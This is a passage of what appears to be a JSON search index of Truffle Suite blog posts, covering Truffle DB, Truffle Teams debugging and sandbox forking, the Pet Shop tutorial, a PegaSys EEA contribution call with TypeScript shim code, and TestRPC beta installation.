text](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-concept-query-graphql)) Truffle DB uses GraphQL for its primary interface. GraphQL affords flexibility and a data-first design methodology that suits our goals well. This interface is intended for use in tools to build on top of Truffle; as a normal user you won\u2019t have to touch this. (Of course, we hope this will encourage you to find new ways to solve problems by building and sharing tools of your own!) Truffle DB is still in development, but we would like to share what we\u2019ve got so far and to talk about where we\u2019re looking to go. Although it\u2019s early, we want to increase awareness about future breaking changes, and we hope to paint a picture of some new foundations that we\u2019re excited will help the smart contract development tools ecosystem. Current status : Internal infrastructure in place, prototyping for public review to begin soon. What we\u2019re releasing first \u00b6 We\u2019re gearing up for a minor release (Truffle v5.1), and we plan to make a first version of Truffle DB available as an experimental implementation. This means building blocks to start: key pieces of infrastructure to paint a picture of Truffle DB for review and iteration. Day 1, this means you will get: * The ability to convert your artifacts and load them into Truffle DB * A mechanism to persist Truffle DB data side-by-side with your artifacts * Improvements to Truffle that take advantage of this data when it exists * A bundled GraphQL playground for hands-on exploration * The ability to easily explore the schema to better understand our system design **Interact with Truffle DB**: Apollo\u2019s [GraphQL Playground](https://www.apollographql.com/docs/apollo-server/features/graphql-playground/) provides a handy way to work with GraphQL interfaces. We\u2019re bundling a Playground instance into Truffle DB to make it easier to learn about. (For text-accessible version, see [query source](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-graphql), [query variables](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-result-json), and the [query result](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-result-json)) What\u2019s left to be done (soon) \u00b6 Since we\u2019ve started by building infrastructure, the work remains to connect the dots into a final design that we can validate for quality and usefulness. This includes: * Documentation, of course! See our current Truffle DB \u2013 Proposal working docs, which include the data model diagrams. Expect us to convert these docs into proper documentation for release. * Better persistence. Our initial implementation will save JSON files to disk, but we intend to support more robust data storage options, including relational databases and native support in Truffle Teams . * Schema design updates, including support for pagination and proper data filtering. * A prototype candidate for Truffle DB\u2019s external interface. The long-term plan \u00b6 We\u2019re going to introduce Truffle DB gradually, deprecating the old artifacts format and introducing Truffle DB more and more as it\u2019s validated. We expect to follow these steps: 1. Release initial Truffle DB features as opt-in and experimental. 1. Gather feedback and support to build a cohesive Truffle DB release candidate (for broad community use). 1. Turn Truffle DB on by default, but continue to use artifacts as the primary data store. 1. Convert the rest of Truffle to use Truffle DB as its primary data store, but continue to maintain artifacts alongside it for compatibility. 1. Continue to maintain both data stores, and switch to using Truffle DB to manage artifacts (instead of existing artifacts management code). 1. Turn off artifacts by default, but maintain legacy support through configuration. 1. Eventually, remove artifacts altogether. We expect this process, start to finish, to span at least two major (breaking change) releases. We plan to maintain legacy support for artifacts for at least 18 months after we release a Truffle DB release candidate. via GIPHY [Weight and Switch](https://tvtropes.org/pmwiki/pmwiki.php/Main/WeightAndSwitch): Dr. Jones demonstrating proper technique for delicate data migration procedures What do you think? \u00b6 Please reach out with questions/thoughts/use case ideas/implementation strategies, or even just to say hello. Your feedback will help us provide the most value and make sure we do so with enough clarity! We\u2019re tracking overall progress in this GitHub issue (trufflesuite/truffle#1718) . Expect to see this filled out more in the coming weeks, so please follow along there if you\u2019re interested. Thanks for reading! Hope to see you at TruffleCon!","title":"Introducing Truffle DB, part 2 - 'Weight and Switch'"},{"location":"blog/introducing-truffle-db-part-2/index.html#what-is-truffle-db","text":"Truffle DB comprises two key ideas, currently at different stages of development. These are: A data model for organizing your project\u2019s smart contracts: how to keep track of all the different pieces of information, from your contract source files to where they are deployed. A flexible JSON data access interface: how to read exactly the data you need and how to update the DB with the data you have.","title":"What is Truffle DB?"},{"location":"blog/introducing-truffle-db-part-2/index.html#data-model","text":"**Data model excerpt**: how contracts, sources, compilers, and compilations all relate. ([Text-accessible version](https://github.com/trufflesuite/artifact-updates/blob/master/docs/uml/macros.iuml) available via diagram source) What is a smart contract? What is your contract\u2019s bytecode, what is its source code, and how do they relate? By looking at how Truffle expects these relationships in practice, and considering how these concepts are commonly understood, we hope to make life easy by creating a shared vocabulary for interacting with the smart contract domain. Diagrams are worth more than words here, so please check out our data model docs to get a broader sense for what this represents. Current status : Implemented as minimally viable, designed to be extended.","title":"Data model"},{"location":"blog/introducing-truffle-db-part-2/index.html#flexible-interface","text":"**Concept image**: Example query to fetch specific project contract info. ([See gist for image text](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-concept-query-graphql)) Truffle DB uses GraphQL for its primary interface. GraphQL affords flexibility and a data-first design methodology that suits our goals well. This interface is intended for use in tools to build on top of Truffle; as a normal user you won\u2019t have to touch this. (Of course, we hope this will encourage you to find new ways to solve problems by building and sharing tools of your own!) Truffle DB is still in development, but we would like to share what we\u2019ve got so far and to talk about where we\u2019re looking to go. Although it\u2019s early, we want to increase awareness about future breaking changes, and we hope to paint a picture of some new foundations that we\u2019re excited will help the smart contract development tools ecosystem. Current status : Internal infrastructure in place, prototyping for public review to begin soon.","title":"Flexible interface"},{"location":"blog/introducing-truffle-db-part-2/index.html#what-were-releasing-first","text":"We\u2019re gearing up for a minor release (Truffle v5.1), and we plan to make a first version of Truffle DB available as an experimental implementation. This means building blocks to start: key pieces of infrastructure to paint a picture of Truffle DB for review and iteration. Day 1, this means you will get: * The ability to convert your artifacts and load them into Truffle DB * A mechanism to persist Truffle DB data side-by-side with your artifacts * Improvements to Truffle that take advantage of this data when it exists * A bundled GraphQL playground for hands-on exploration * The ability to easily explore the schema to better understand our system design **Interact with Truffle DB**: Apollo\u2019s [GraphQL Playground](https://www.apollographql.com/docs/apollo-server/features/graphql-playground/) provides a handy way to work with GraphQL interfaces. We\u2019re bundling a Playground instance into Truffle DB to make it easier to learn about. (For text-accessible version, see [query source](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-graphql), [query variables](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-result-json), and the [query result](https://gist.github.com/gnidan/c653c57a69adf50f5d60b7d0c1d3c6a2#file-playground-query-result-json))","title":"What we\u2019re releasing first"},{"location":"blog/introducing-truffle-db-part-2/index.html#whats-left-to-be-done-soon","text":"Since we\u2019ve started by building infrastructure, the work remains to connect the dots into a final design that we can validate for quality and usefulness. This includes: * Documentation, of course! See our current Truffle DB \u2013 Proposal working docs, which include the data model diagrams. Expect us to convert these docs into proper documentation for release. * Better persistence. Our initial implementation will save JSON files to disk, but we intend to support more robust data storage options, including relational databases and native support in Truffle Teams . * Schema design updates, including support for pagination and proper data filtering. * A prototype candidate for Truffle DB\u2019s external interface.","title":"What\u2019s left to be done (soon)"},{"location":"blog/introducing-truffle-db-part-2/index.html#the-long-term-plan","text":"We\u2019re going to introduce Truffle DB gradually, deprecating the old artifacts format and introducing Truffle DB more and more as it\u2019s validated. We expect to follow these steps: 1. Release initial Truffle DB features as opt-in and experimental. 1. Gather feedback and support to build a cohesive Truffle DB release candidate (for broad community use). 1. Turn Truffle DB on by default, but continue to use artifacts as the primary data store. 1. Convert the rest of Truffle to use Truffle DB as its primary data store, but continue to maintain artifacts alongside it for compatibility. 1. Continue to maintain both data stores, and switch to using Truffle DB to manage artifacts (instead of existing artifacts management code). 1. Turn off artifacts by default, but maintain legacy support through configuration. 1. Eventually, remove artifacts altogether. We expect this process, start to finish, to span at least two major (breaking change) releases. We plan to maintain legacy support for artifacts for at least 18 months after we release a Truffle DB release candidate. via GIPHY [Weight and Switch](https://tvtropes.org/pmwiki/pmwiki.php/Main/WeightAndSwitch): Dr. Jones demonstrating proper technique for delicate data migration procedures","title":"The long-term plan"},{"location":"blog/introducing-truffle-db-part-2/index.html#what-do-you-think","text":"Please reach out with questions/thoughts/use case ideas/implementation strategies, or even just to say hello. Your feedback will help us provide the most value and make sure we do so with enough clarity! We\u2019re tracking overall progress in this GitHub issue (trufflesuite/truffle#1718) . Expect to see this filled out more in the coming weeks, so please follow along there if you\u2019re interested. Thanks for reading! Hope to see you at TruffleCon!","title":"What do you think?"},{"location":"blog/iterate-faster-with-truffle-teams/index.html","text":"Consider the amount of context switching required to develop a dapp: you\u2019re writing Solidity one minute, writing tests another, debugging those results--it\u2019s easy to get lost! These switches carry a cognitive load and when errors equal a loss of ETH we need all the help we can get. I\u2019m happy to inform you Truffle Teams can help reduce context switching and help you or your team iterate faster. Truffle Teams has reached a very important stage in its life: it now provides a complete workflow including building, testing, managing, monitoring, and debugging. This means you\u2019re getting a huge boost in productivity. This amounts to a more robust workflow for you and/or your team and contributes to the application lifecycle generally by tightening the feedback loop between deployment, operation, and debugging all within a flexible development network. The development lifecycle. Up to this point, Truffle Teams has already offered a builds system, deployment manager, blockchain sandboxes, and monitoring. Recently we released a visual debugger into early access. With that, we\u2019d like to highlight two features that completed this cycle: the Debugger and the Contract Manager. For a great video example, check out our demo from TruffleCon 2020. We briefly touch all the phases talked about above using a rock, paper, scissors game. For something more long-form, check out our 5-part webinar series walking you through using the Truffle suite to create an NFT and trade it on a decentralized marketplace. Mike Seese and Josh Quintal go over the entire development lifecycle using Truffle Teams for a decentralized rock, paper, scissors dapp. Debugger Enhancements \u00b6 Note : To use the debugger right away, you'll need to opt-in to Truffle Teams Early Access . Truffle offers a sophisticated forensic transaction debugger and allows you to extract the most information and context possible from your transactions. We released a graphical version of our command line debugger into Truffle Teams Early Access in December. Since then we\u2019ve added syntax highlighting and breakpoints for an improved developer experience. Readability increases and you control where execution stops, providing a precision debugging experience. Check out the Truffle Teams debugger docs to learn more about breakpoints. Currently the debugger in Truffle Teams only works for sandbox environments, but we plan on supporting public networks next! The Truffle Teams Debugger--now with syntax highlighting and breakpoints! ## The Contract Manager Note : To use the contract manager right away, you'll need to opt-in to Truffle Teams Early Access . Truffle Teams\u2019 Contract Manager generates a UI for interacting with all the functions of your smart contracts, as well as a live state tree so you can quickly see the changes propagated by those functions. If you\u2019re familiar with Remix, you\u2019ll feel right at home here. The Contract Manager; shown here using an NFT badge. The Contract Manager is great for quick demos, integration tests, and a faster, all-GUI debugging workflow. For example, you can deploy to a sandbox via the deployment wizard, hop over to the contract manager to fire off a few transactions, and finally debug these transactions from the monitoring screen. ## Dapp Topography Going forward, we\u2019ll be helping you understand your dapp on an even deeper level, offering forensic-level analysis of your transactions. Not only that, but it will be able to diagram contract interaction to allow different stakeholders to participate in the debugging process. For example a product manager, or other domain expert can participate in the forensic analysis. These diagrams and other assets can be shareable media that can fit into existing communication channels. A test in which a user who isn't the owner of an ENS name attempt to change the resolver. Note the \"X\" shoing the revert. ## Get Started with Truffle Teams We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Check out Truffle Teams today and let us know what you think about the new deployment views and contract manager, or if your team has other needs we haven\u2019t met yet. SIGN UP FOR THE TRUFFLE TEAMS TRUFFLE TEAMS QUICKSTART Thanks! _Josh Quintal, Head of Product & Marketing_","title":"Iterate Faster with Truffle Teams"},{"location":"blog/iterate-faster-with-truffle-teams/index.html#debugger-enhancements","text":"Note : To use the debugger right away, you'll need to opt-in to Truffle Teams Early Access . Truffle offers a sophisticated forensic transaction debugger and allows you to extract the most information and context possible from your transactions. We released a graphical version of our command line debugger into Truffle Teams Early Access in December. Since then we\u2019ve added syntax highlighting and breakpoints for an improved developer experience. Readability increases and you control where execution stops, providing a precision debugging experience. Check out the Truffle Teams debugger docs to learn more about breakpoints. Currently the debugger in Truffle Teams only works for sandbox environments, but we plan on supporting public networks next! The Truffle Teams Debugger--now with syntax highlighting and breakpoints! ## The Contract Manager Note : To use the contract manager right away, you'll need to opt-in to Truffle Teams Early Access . Truffle Teams\u2019 Contract Manager generates a UI for interacting with all the functions of your smart contracts, as well as a live state tree so you can quickly see the changes propagated by those functions. If you\u2019re familiar with Remix, you\u2019ll feel right at home here. The Contract Manager; shown here using an NFT badge. The Contract Manager is great for quick demos, integration tests, and a faster, all-GUI debugging workflow. For example, you can deploy to a sandbox via the deployment wizard, hop over to the contract manager to fire off a few transactions, and finally debug these transactions from the monitoring screen. ## Dapp Topography Going forward, we\u2019ll be helping you understand your dapp on an even deeper level, offering forensic-level analysis of your transactions. Not only that, but it will be able to diagram contract interaction to allow different stakeholders to participate in the debugging process. For example a product manager, or other domain expert can participate in the forensic analysis. These diagrams and other assets can be shareable media that can fit into existing communication channels. A test in which a user who isn't the owner of an ENS name attempt to change the resolver. Note the \"X\" shoing the revert. ## Get Started with Truffle Teams We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Check out Truffle Teams today and let us know what you think about the new deployment views and contract manager, or if your team has other needs we haven\u2019t met yet. SIGN UP FOR THE TRUFFLE TEAMS TRUFFLE TEAMS QUICKSTART Thanks! _Josh Quintal, Head of Product & Marketing_","title":"Debugger Enhancements"},{"location":"blog/learn-ethereum-the-fun-way-with-our-pet-shop-tutorial/index.html","text":"Here at Truffle we want to make Ethereum development accessible to developers of all stripes. To that end, today we're releasing a new tutorial called Pet Shop . It covers the entire local development process, start to finish. For added fun, we've tied the whole thing together within the narrative of creating a pet adoption dapp for a local pet shop owner. Here's a preview of what's covered: Setting up The Development Environment Creating a Truffle Project using a Truffle Box Writing and Testing a Smart Contract Creating a UI to Interact with our Smart Contract By then end of the tutorial you'll have a shiny new dapp with which you can reserve pets for adoption. In the future we'll be building on this tutorial with others such as deploying to live testnets and additional, more advanced functionality. We hope you enjoy and thank everyone for your support! Got stuck? The fastest way to get help is from our community Gitter channel , where hundreds of your fellow Trufflers congregate to answer your questions. Love it? Send us your feedback on Twitter . Found a problem? Let us know by raise a GitHub issue if there's something you think we can improve! Pull requests are always welcome! Cheers! -- Josh & the Truffle Team","title":"Learn Ethereum The Fun Way with our Pet Shop Tutorial"},{"location":"blog/one-hundred-documentation-pull-requests/index.html","text":"Greetings! The Truffle team has been growing over the course of the last year. From a single developer, we are now a team of five (soon to be even more), which means that we can spread the work around. As a new full-time member of the team, I've first taken to looking at our existing materials to ensure that everything is up-to-date and working well. For example, our website, a public GitHub repository, had been receiving pull requests (PRs) for the better part of a year, and they had been languishing for want of someone to go through them. We're not talking a few or even a dozen. We're talking almost 100 PRs . All I can say is: wow . I've been working in the open source software world for about a decade, and I've never seen so many people freely offering suggestions to documentation. As we all ruefully know, documentation can be first to go out of date and last to be updated, so knowing that our community is keeping such an eagle eye on even minute details says a lot. And I do mean minute details . When one of our tutorials wrote \"tag a stab\" instead of \"take a stab\", not less than ten of you took the time to submit pull requests telling us so. Take a stab indeed Make no mistake: this is good thing. I believe in the Broken Windows theory as it applies to documentation. We want to fix up the small things now so we can maintain the larger things more easily in the future. We have big plans for our content here, just like we have big plans for Truffle. (Check out the new features coming in Truffle 4 ( https://github.com/trufflesuite/truffle/releases/tag/v4.0.0-beta.0 )!) And note that we have since separated out the website source code to its own repository to make submissions easier for the community. I'm happy to be part of a community that cares about what we're doing, reducing the bar to developing Ethereum dapps, and making them delicious. As for your suggestions on how we can serve you even better? Please keep them coming. Submit a pull request to our documentation, reach out on Twitter , or let us know if there's something we can improve by raising a GitHub issue . Need help with something? Reach out on our community Gitter channel , where hundreds of your fellow Trufflers congregate to answer your questions. -- Mike & the Truffle team Mike Pumphrey is an Enterprise Trainer at ConsenSys working on the Truffle team. With over a dozen years of experience in documentation, support, and training, Mike is passionate about making technical concepts understandable to a wider audience. He believes that great software can only be great when people know how to use it, and is excited to be bringing clarity to a field as exciting and new as blockchain.","title":"One hundred documentation pull requests? Yes please."},{"location":"blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/index.html","text":"Open call for contributions by Truffle + PegaSys: EEA private transactions \u00b6 What's missing? \u00b6 In its current state, Truffle doesn't support EEA private transactions. Support for the web3js-eea library is needed for this to work and PegaSys has recently made an implementation of the v4.0 EEA specification. Why did this happen? \u00b6 The interface-adapter in Truffle\u2019s codebase doesn\u2019t provide an adapter for the EEA 4.0 client spec, therefore private transactions aren\u2019t working. The EEA client specification is a developing specification and Truffle has not yet implemented the EEA client specification around private transactions. PegaSys is providing an implementation of the specification for private transactions. Pegasys and Truffle are teaming up to ensure that Truffle supports the EEA JSON RPC API methods. What's the solution? \u00b6 PegaSys and Truffle have teamed up to make a single open call for contributions. This guest blog post is made by the PegaSys team and is to be posted on the Truffle blog and promoted by both teams in order to add code to Truffle codebase to add support for them. The solution involves using a Delegation pattern to help make that work. The location of the files to be modified can be found here: truffle/packages/interface-adapter/lib In short, when Truffle receives a transaction, it should determine if its a privateFor transaction. If so, it would delegate the rest of the business logic to the EEA library. If not, it should just continue processing the transaction with the original web3 methods. Also, it would be very useful to make sure this plays nicely with the getTransactionReceipt methods later in the chain of events. What to do Exactly? \u00b6 The initial process involves adding an EEA definition to the shim file. The web3-shim.ts file currently contains the overloads for the different interface definitions and their mappings. import { EthereumDefinition } from \"./ethereum-overloads\" ; import { QuorumDefinition } from \"./quorum-overloads\" ; import { FabricEvmDefinition } from \"./fabric-evm-overloads\" ; const initInterface = async ( web3Shim : Web3Shim ) => { const networkTypes : NetworkTypesConfig = new Map ( Object . entries ({ \"ethereum\" : EthereumDefinition , \"quorum\" : QuorumDefinition , \"fabric-evm\" : FabricEvmDefinition })); networkTypes . get ( web3Shim . networkType ). initNetworkType ( web3Shim ); } The initial import and mapping has been done in this fork . import { EthereumDefinition } from \"./ethereum-overloads\" ; import { EEADefinition } from \"./EEA-overloads\" ; import { QuorumDefinition } from \"./quorum-overloads\" ; import { FabricEvmDefinition } from \"./fabric-evm-overloads\" ; const initInterface = async ( web3Shim : Web3Shim ) => { const networkTypes : NetworkTypesConfig = new Map ( Object . entries ({ \"ethereum\" : EthereumDefinition , \"EEA\" : EEADefinition , \"quorum\" : QuorumDefinition , \"fabric-evm\" : FabricEvmDefinition })); networkTypes . get ( web3Shim . networkType ). initNetworkType ( web3Shim ); } The rest of the owl is to add the needed logic in the eea-overloads.ts file and the overrides variable for it to interact with the web3eeajs library . Who can do this? \u00b6 Anyone who'd like to try can very much do so we will gladly support any developer who wants to help out. But here are some recommended prerequisites: The Truffle codebase is mainly written in javascript , and this particular interface-adapter library we'll be looking at is written in typescript . So knowing some javascript is a must. It will definitely help if you've had some exposure and usage of the Truffle library. Nothing fancy, just using it for compiling and deploying contracts for example. Likewise, having some previous knowledge of the web3js library is going to prove quite helpful. All of the above somewhat describes a general dapp developer- so in other words; if you've already written a dapp before using Truffle, this contribution could be done by you. So what's in it for you? Two things: - You'll receive some \ud83d\ude0e PegaSys Swag! - We'll personally thank and credit you on stage at Trufflecon at my Permissioning Talk For more information or help on this contribution, contact Felipe from PegaSys , or write us on our gitter channel .","title":"Open call for contributions by Truffle + PegaSys - EEA private transactions"},{"location":"blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/index.html#open-call-for-contributions-by-truffle-pegasys-eea-private-transactions","text":"","title":"Open call for contributions by Truffle + PegaSys: EEA private transactions"},{"location":"blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/index.html#whats-missing","text":"In its current state, Truffle doesn't support EEA private transactions. Support for the web3js-eea library is needed for this to work and PegaSys has recently made an implementation of the v4.0 EEA specification.","title":"What's missing?"},{"location":"blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/index.html#why-did-this-happen","text":"The interface-adapter in Truffle\u2019s codebase doesn\u2019t provide an adapter for the EEA 4.0 client spec, therefore private transactions aren\u2019t working. The EEA client specification is a developing specification and Truffle has not yet implemented the EEA client specification around private transactions. PegaSys is providing an implementation of the specification for private transactions. Pegasys and Truffle are teaming up to ensure that Truffle supports the EEA JSON RPC API methods.","title":"Why did this happen?"},{"location":"blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/index.html#whats-the-solution","text":"PegaSys and Truffle have teamed up to make a single open call for contributions. This guest blog post is made by the PegaSys team and is to be posted on the Truffle blog and promoted by both teams in order to add code to Truffle codebase to add support for them. The solution involves using a Delegation pattern to help make that work. The location of the files to be modified can be found here: truffle/packages/interface-adapter/lib In short, when Truffle receives a transaction, it should determine if its a privateFor transaction. If so, it would delegate the rest of the business logic to the EEA library. If not, it should just continue processing the transaction with the original web3 methods. Also, it would be very useful to make sure this plays nicely with the getTransactionReceipt methods later in the chain of events.","title":"What's the solution?"},{"location":"blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/index.html#what-to-do-exactly","text":"The initial process involves adding an EEA definition to the shim file. The web3-shim.ts file currently contains the overloads for the different interface definitions and their mappings. import { EthereumDefinition } from \"./ethereum-overloads\" ; import { QuorumDefinition } from \"./quorum-overloads\" ; import { FabricEvmDefinition } from \"./fabric-evm-overloads\" ; const initInterface = async ( web3Shim : Web3Shim ) => { const networkTypes : NetworkTypesConfig = new Map ( Object . entries ({ \"ethereum\" : EthereumDefinition , \"quorum\" : QuorumDefinition , \"fabric-evm\" : FabricEvmDefinition })); networkTypes . get ( web3Shim . networkType ). initNetworkType ( web3Shim ); } The initial import and mapping has been done in this fork . import { EthereumDefinition } from \"./ethereum-overloads\" ; import { EEADefinition } from \"./EEA-overloads\" ; import { QuorumDefinition } from \"./quorum-overloads\" ; import { FabricEvmDefinition } from \"./fabric-evm-overloads\" ; const initInterface = async ( web3Shim : Web3Shim ) => { const networkTypes : NetworkTypesConfig = new Map ( Object . entries ({ \"ethereum\" : EthereumDefinition , \"EEA\" : EEADefinition , \"quorum\" : QuorumDefinition , \"fabric-evm\" : FabricEvmDefinition })); networkTypes . get ( web3Shim . networkType ). initNetworkType ( web3Shim ); } The rest of the owl is to add the needed logic in the eea-overloads.ts file and the overrides variable for it to interact with the web3eeajs library .","title":"What to do Exactly?"},{"location":"blog/open-call-for-contributions-truffle-pegasys-eea-private-transactions/index.html#who-can-do-this","text":"Anyone who'd like to try can very much do so we will gladly support any developer who wants to help out. But here are some recommended prerequisites: The Truffle codebase is mainly written in javascript , and this particular interface-adapter library we'll be looking at is written in typescript . So knowing some javascript is a must. It will definitely help if you've had some exposure and usage of the Truffle library. Nothing fancy, just using it for compiling and deploying contracts for example. Likewise, having some previous knowledge of the web3js library is going to prove quite helpful. All of the above somewhat describes a general dapp developer- so in other words; if you've already written a dapp before using Truffle, this contribution could be done by you. So what's in it for you? Two things: - You'll receive some \ud83d\ude0e PegaSys Swag! - We'll personally thank and credit you on stage at Trufflecon at my Permissioning Talk For more information or help on this contribution, contact Felipe from PegaSys , or write us on our gitter channel .","title":"Who can do this?"},{"location":"blog/removing-installation-issues-continued-testrpc/index.html","text":"**Update**: Since this blog post was published, we have released [Ganache](/ganache) a personal blockchain and a replacement to the TestRPC. We have left this post unaltered, but we highly recommend checking out our [Working with Ganache](/docs/ganache/using) page. If you've been following along, you'll know that we recently removed most if not all installation issues from Truffle . For us it was a pretty big deal: Installation issues were, by far, the number one issue plaguing new users on any platform. We thought our solution was novel, so we blogged about it, and the biggest reaction we received from users was, \"This is awesome, thank you! But can you do it for the TestRPC too?\" Well you asked, and today we delivered. The TestRPC has always been the sister application to Truffle, and for good reason. The TestRPC gives users a personal blockchain with which to develop, drastically lowering the barrier to entry of Ethereum development and removing the need for mining or dealing with real Ether. Developing on the TestRPC is an integral part of every Ethereum project, and it's usually the first blockchain deployed to in a professional Ethereum developer's workflow. We'll be blogging about the ideal Truffle workflow a bit later, but instead of waiting, you can just let Chris Hitchcott from Digix Global show you how it's done . (Thank you Chris, this was a great presentation.) Fixing installation issues on the TestRPC required the very same solution as fixing them on Truffle, so we won't go into detail here. However, I will say the solution worked even better for the TestRPC than it did for Truffle. This is because the bundle we were able to create didn't require any external dependencies, making the package that you install just a single download. When compared to the old installation, the experience is night and day. Getting the new version \u00b6 Like Truffle, we need you to put this version through its paces before we can release it as an official version, so we've released it in beta . To get the beta version, first uninstall the version of the TestRPC you currently have (because they'll conflict): $ npm uninstall -g ethereumjs-testrpc And now install the beta version: $ npm install -g ethereumjs-testrpc@beta (If you're on a Unix-based system, you may have to prefix the above commands with sudo .) You'll notice that the beta version installs instantly, quicker than you can say, \"Holy crap, this is awesome.\" So what's next? \u00b6 We have a lot of things planned for the TestRPC. We're not ready to officially announce everything just yet, but know that solving these installation issues is a stepping stone to providing you the best Ethereum development experience possible. Like creamy ganache filling is to a chocolate truffle, so is the TestRPC to the core of your workflow. So stay tuned. It's gonna be sweet. -- Tim & the Truffle Team","title":"Removing installation issues, con't - TestRPC"},{"location":"blog/removing-installation-issues-continued-testrpc/index.html#getting-the-new-version","text":"Like Truffle, we need you to put this version through its paces before we can release it as an official version, so we've released it in beta . To get the beta version, first uninstall the version of the TestRPC you currently have (because they'll conflict): $ npm uninstall -g ethereumjs-testrpc And now install the beta version: $ npm install -g ethereumjs-testrpc@beta (If you're on a Unix-based system, you may have to prefix the above commands with sudo .) You'll notice that the beta version installs instantly, quicker than you can say, \"Holy crap, this is awesome.\"","title":"Getting the new version"},{"location":"blog/removing-installation-issues-continued-testrpc/index.html#so-whats-next","text":"We have a lot of things planned for the TestRPC. We're not ready to officially announce everything just yet, but know that solving these installation issues is a stepping stone to providing you the best Ethereum development experience possible. Like creamy ganache filling is to a chocolate truffle, so is the TestRPC to the core of your workflow. So stay tuned. It's gonna be sweet. -- Tim & the Truffle Team","title":"So what's next?"},{"location":"blog/sandbox-forking-with-truffle-teams/index.html","text":"Sandboxes in Truffle Teams are the easiest way to setup a shared Ganache instance for the entire team. They integrate seamlessly with our deployments manager, and work locally as expected too: insert the mnemonic and RPC URL into your Truffle config or browser wallet and starting sending ether, deploying contracts, interacting via the console and more! We\u2019re not stopping there though. Today we\u2019re proud to introduce live network simulation via sandbox forking! Introducing Forking \u00b6 Forking allows a sandbox to act as a live network from a given block number. We take for granted in web2 that we can get test credentials and interact with an API that will map to our production environment, but in web3 this hasn\u2019t been so easy. With a forked sandbox you can transact, deploy, test, and debug against Mainnet without spending real Ether! Forking has been available since 2017 ( see this older tutorial ), but the requirement of a full archival node was a barrier for many. By adding this ability to Truffle Teams, you no longer need to worry about anything--just select a network and go. Here are some more specific examples: DeFi : Some DeFi protocols have testnet deployments that differ from their Mainnet counterparts for a variety of reasons. For dapp developers, this inconsistency presents a problem. You want to develop against the \u201creal\u201d protocol, but developing in production is terrible, especially when real ETH is at stake! With forking, you\u2019re free to simply fork Mainnet and deploy your dapp to an environment that translates to the live network. Testing : Ensuring your dapp integrates with another used to require getting those contracts, deploying them to your local test network or a live testnet (assuming there\u2019s no comparable testnet deployment already), then finally running your tests. With a forked sandbox your target dapp is already there, with its state. Want to test your CryptoKitty item? You can do it with your actual kitty! Security Analysis : Dynamic analysis, the process of executing code and data in real-time with the hope of finding issues during execution, has never been easier. With the ability to take control of any account on the given network and travel through time by selecting an older block, you can run attacks live and see exactly what went wrong. How to Create a Forked Sandbox \u00b6 A forked Mainnet sandbox. To fork a network, create a new sandbox and check the forking checkbox. From there, select a network and optionally provide a block number. Clicking CONFIRM will spin up a new Ganache instance forked from the given network and block. For more details, see our sandboxes documentation. You can now interact with this sandbox as you would the forked network. Using Ethereum Mainnet as an example: you can call out to Mainnet contracts, and send ETH to Mainnet addresses. START TESTING AGAINST PRODUCTION NETWORKS TODAY! How Will you Use Forking? \u00b6 We\u2019re very proud of this feature and think it\u2019s going to be a game-changer for the community. We\u2019re curious: how will you use forking? We want Truffle Teams to be the most effective devops tool in the blockchain space for both new and existing teams. Join our slack community and let us know what you think about this feature, and if your team has other needs we haven\u2019t met yet. Thank you! Josh Quintal, Head of Product & Marketing","title":"Simulate Live Networks with Forked Sandboxes"},{"location":"blog/sandbox-forking-with-truffle-teams/index.html#introducing-forking","text":"Forking allows a sandbox to act as a live network from a given block number. We take for granted in web2 that we can get test credentials and interact with an API that will map to our production environment, but in web3 this hasn\u2019t been so easy. With a forked sandbox you can transact, deploy, test, and debug against Mainnet without spending real Ether! Forking has been available since 2017 ( see this older tutorial ), but the requirement of a full archival node was a barrier for many. By adding this ability to Truffle Teams, you no longer need to worry about anything--just select a network and go. Here are some more specific examples: DeFi : Some DeFi protocols have testnet deployments that differ from their Mainnet counterparts for a variety of reasons. For dapp developers, this inconsistency presents a problem. You want to develop against the \u201creal\u201d protocol, but developing in production is terrible, especially when real ETH is at stake! With forking, you\u2019re free to simply fork Mainnet and deploy your dapp to an environment that translates to the live network. Testing : Ensuring your dapp integrates with another used to require getting those contracts, deploying them to your local test network or a live testnet (assuming there\u2019s no comparable testnet deployment already), then finally running your tests. With a forked sandbox your target dapp is already there, with its state. Want to test your CryptoKitty item? You can do it with your actual kitty! Security Analysis : Dynamic analysis, the process of executing code and data in real-time with the hope of finding issues during execution, has never been easier. With the ability to take control of any account on the given network and travel through time by selecting an older block, you can run attacks live and see exactly what went wrong.","title":"Introducing Forking"},{"location":"blog/sandbox-forking-with-truffle-teams/index.html#how-to-create-a-forked-sandbox","text":"A forked Mainnet sandbox. To fork a network, create a new sandbox and check the forking checkbox. From there, select a network and optionally provide a block number. Clicking CONFIRM will spin up a new Ganache instance forked from the given network and block. For more details, see our sandboxes documentation. You can now interact with this sandbox as you would the forked network. Using Ethereum Mainnet as an example: you can call out to Mainnet contracts, and send ETH to Mainnet addresses. START TESTING AGAINST PRODUCTION NETWORKS TODAY!","title":"How to Create a Forked Sandbox"},{"location":"blog/sandbox-forking-with-truffle-teams/index.html#how-will-you-use-forking","text":"We\u2019re very proud of this feature and think it\u2019s going to be a game-changer for the community. We\u2019re curious: how will you use forking? We want Truffle Teams to be the most effective devops tool in the blockchain space for both new and existing teams. Join our slack community and let us know what you think about this feature, and if your team has other needs we haven\u2019t met yet. Thank you! Josh Quintal, Head of Product & Marketing","title":"How Will you Use Forking?"},{"location":"blog/stack-tracing-with-truffle-test/index.html","text":"Truffle Test can now provide stacktraces when your transactions revert! This is still a little experimental, and it requires truffle test to recompile all your contracts, so you\u2019ll have to enable it with truffle test 